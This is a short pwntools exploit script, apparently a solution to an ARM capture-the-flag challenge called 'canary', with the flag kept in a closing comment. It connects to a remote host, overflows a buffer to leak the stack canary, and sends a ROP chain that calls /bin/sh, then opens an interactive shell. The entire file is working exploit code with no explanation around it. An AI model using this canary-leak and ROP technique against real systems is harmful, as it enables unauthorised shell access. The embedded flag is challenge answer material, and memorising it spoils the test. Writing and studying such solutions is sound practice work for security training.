from pwn import *

context.arch = "arm"
#context.terminal = ["terminator","-e"]
#context.log_level = "debug"
#p = process(["qemu-arm","canary"])
p = remote("116.203.30.62",18113)
#p = remote("127.0.0.1",2333)
p.sendafter("> ","A"*0x11)
p.recvuntil("A"*0x11)
canary = u32("\x00"+p.recv(3))
success("canary-->"+hex(canary))
payload  = "A"*0x28
payload += p32(canary)
payload += "B"*0xc
payload += p32(0x26b7c) # pop {r0, r4, pc}
payload += p32(0x71EB0) # /bin/sh
payload += p32(0x23333)
payload += p32(0x16D90)
p.sendafter("> ",payload)
p.sendline()
p.interactive()

#hxp{w3lc0m3_70_7h3_31337_club_k1dd0}ls
